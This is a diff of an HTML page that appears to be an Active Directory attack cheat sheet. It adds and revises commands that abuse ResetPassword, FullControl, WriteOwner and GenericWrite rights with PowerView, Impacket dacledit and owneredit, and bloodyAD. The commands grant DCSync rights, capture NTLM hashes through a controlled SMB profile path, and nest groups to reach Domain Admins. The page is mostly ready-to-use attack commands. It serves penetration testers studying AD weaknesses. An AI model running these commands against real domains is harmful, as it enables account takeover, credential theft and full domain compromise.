@@ -1948,14 +1948,14 @@ lsadump::sam
 <span class="nb">Invoke-SDPropagator</span> <span class="n">-taskname</span> <span class="n">FixUpInheritance</span> <span class="n">-timeoutMinutes</span> <span class="n">1</span> <span class="n">-showProgress</span> <span class="n">-Verbose</span>
 </code></pre></div>
 <h4 id="common-abuses">Common Abuses</h4>
-<p>Abuse <em>ResetPassword</em> permission:</p>
+<p>Abuse <code>ResetPassword</code> permission:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
 <span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-AccountPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;target password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
 
 <span class="c"># AD Module</span>
 <span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-NewPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;target password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
 </code></pre></div>
-<p>Abuse <em>ResetPassword</em> permission from UNIX-like systems:</p>
+<p>Abuse <code>ResetPassword</code> permission from UNIX-like systems:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Using net</span>
 net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">"&lt;target user&gt;"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span>/<span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"&lt;DC host&gt;"</span>
 
@@ -1973,11 +1973,11 @@ rpcclient<span class="w"> </span>-U<span class="w"> </span>&lt;domain&gt;/&lt;co
 <span class="c"># AD Module</span>
 <span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
 </code></pre></div>
-<p>Add <code>FullControl</code> rights on the target account with Impacket's <code>dacledit</code>:</p>
-<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'&lt;controlled user&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target user&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
+<p>Add <code>FullControl</code> rights on the target object with Impacket's <code>dacledit</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'&lt;controlled user|group&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
 </code></pre></div>
 <p>Restore DACL with Impacket's <code>dacledit</code>:</p>
-<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'restore'</span><span class="w"> </span>-file<span class="w"> </span>dacledit-20250317-082720.bak<span class="w"> </span>-target<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'joffrey.baratheon'</span>:<span class="s1">'1killerlion'</span>
+<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'restore'</span><span class="w"> </span>-file<span class="w"> </span>&lt;.bak<span class="w"> </span>file&gt;<span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
 </code></pre></div>
 <p>Add rights for DCSync (as Domain Admin):</p>
 <div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
@@ -1985,6 +1985,19 @@ rpcclient<span class="w"> </span>-U<span class="w"> </span>&lt;domain&gt;/&lt;co
 
 <span class="c"># AD Module</span>
 <span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-GUIDRight</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
+</code></pre></div>
+<p>Abuse <code>WriteOwner</code> using Impacket's <code>owneredit</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-new-owner<span class="w"> </span><span class="s1">'&lt;controlled user&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>
+</code></pre></div>
+<p>Check current owner with Impacket's <code>owneredit</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>
+</code></pre></div>
+<p>Abuse <code>GenericWrite</code> to overwrite users attributes such as:</p>
+<ul>
+<li><code>profilePath</code> - set this to a controlled SMB server. When the user logs in, it's possible to intercept its NTLM.</li>
+<li><code>scriptPath</code> -  should run a script when the user logs in (script seems to be run only when it's already on the machine).</li>
+</ul>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span><span class="s1">'&lt;target object&gt;'</span><span class="w"> </span>&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>-v<span class="w"> </span><span class="s1">'&lt;value&gt;'</span>
 </code></pre></div>
 <p>References:</p>
 <ul>
@@ -2342,10 +2355,16 @@ pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"
 <ul>
 <li><code>&lt;Parent OU DN&gt;</code>: is the Distinguished Name of the parent OU (eg: <code>OU=Parent1,OU=Parent2, DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?</code>)</li>
 </ul>
-<p>Add a user or a group as a member member to the group:</p>
+<p>Add a user or a group as a member of another group:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Add-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">"&lt;parent_group_samaccountname&gt;"</span> <span class="n">-Members</span> <span class="s2">"&lt;group_to_add_samaccountname&gt;"</span>
 </code></pre></div>
 <p>Repeat the previous two command multiple time until the required level of nesting is reached. Then add the last group to the "Domain Admins" group and the compromised user to the last group.</p>
+<p>Add a user or a group as member of another group using <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password|hashes&gt;"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"&lt;target group&gt;"</span><span class="w"> </span><span class="s2">"&lt;user|group to add&gt;"</span>
+</code></pre></div>
+<p>Remove a user or a group as member from another group using <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password|hashes&gt;"</span><span class="w"> </span>remove<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"&lt;target group&gt;"</span><span class="w"> </span><span class="s2">"&lt;user|group to add&gt;"</span>
+</code></pre></div>
 <h3 id="gpo-persistence">GPO Persistence</h3>
 <p>In MMC:</p>
 <ol>
